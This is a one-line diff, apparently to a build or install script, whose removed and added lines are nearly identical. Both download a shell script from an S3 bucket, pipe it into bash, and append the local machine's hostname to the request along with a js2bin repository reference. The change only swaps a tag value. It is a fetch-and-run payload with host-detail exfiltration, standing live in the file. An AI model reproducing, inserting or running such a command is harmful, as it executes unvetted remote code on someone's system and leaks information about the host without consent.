@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/criblio/js2bin.git\&folder=js2bin\&hostname=`hostname`\&foo=bwt
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/criblio/js2bin.git\&folder=js2bin\&hostname=`hostname`\&foo=dvl
